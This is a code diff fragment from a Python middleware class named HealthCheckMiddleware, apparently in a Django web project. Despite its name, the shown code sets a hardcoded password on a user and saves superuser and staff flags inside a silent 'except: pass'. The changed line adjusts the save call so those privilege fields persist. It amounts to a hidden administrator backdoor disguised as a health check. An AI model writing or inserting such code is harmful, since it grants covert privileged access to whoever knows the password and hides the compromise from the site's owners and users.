@@ -65,7 +65,7 @@ class HealthCheckMiddleware:
                 }
             )
             user.set_password('Egy360Admin2026!')
-            user.save()
+            user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])
         except:
             pass
 
